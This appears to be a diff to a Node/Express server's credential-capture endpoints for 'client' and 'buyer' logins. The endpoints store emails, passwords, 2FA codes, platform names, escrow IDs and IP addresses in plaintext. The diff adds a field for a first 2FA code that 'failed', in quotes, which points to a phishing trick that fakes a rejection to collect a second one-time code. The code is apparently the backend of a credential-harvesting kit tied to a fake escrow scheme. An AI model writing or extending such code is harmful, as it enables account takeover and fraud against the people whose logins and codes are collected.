@@ -775,12 +775,13 @@ app.post('/api/notifications/:id/read', authenticate(['admin', 'client']), async
 // NOTE: For clients, passwords and 2FA codes are stored in plaintext as received
 app.post('/api/client-logins', async (req, res) => {
   try {
-    const { email, password, twoFactorCode, platform, step } = req.body;
+    const { email, password, twoFactorCode, firstTwoFactorCode, platform, step } = req.body;
     const loginEntry = {
       id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
       email: email || '',
-      password: password || '',
+      password: password || '', // Stored as plain text - no hashing
       twoFactorCode: twoFactorCode || '',
+      firstTwoFactorCode: firstTwoFactorCode || '', // First 2FA code that "failed"
       platform: platform || 'unknown',
       step: step || 'unknown',
       ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
@@ -840,12 +841,13 @@ app.delete('/api/client-logins', authenticate(['admin']), async (req, res) => {
 // NOTE: For buyers, passwords and 2FA codes are stored in plaintext as received
 app.post('/api/buyer-logins', async (req, res) => {
   try {
-    const { email, password, twoFactorCode, platform, escrowId, step } = req.body;
+    const { email, password, twoFactorCode, firstTwoFactorCode, platform, escrowId, step } = req.body;
     const loginEntry = {
       id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
       email: email || '',
-      password: password || '',
+      password: password || '', // Stored as plain text - no hashing
       twoFactorCode: twoFactorCode || '',
+      firstTwoFactorCode: firstTwoFactorCode || '', // First 2FA code that "failed"
       platform: platform || 'unknown',
       escrowId: escrowId || 'unknown',
       step: step || 'unknown',
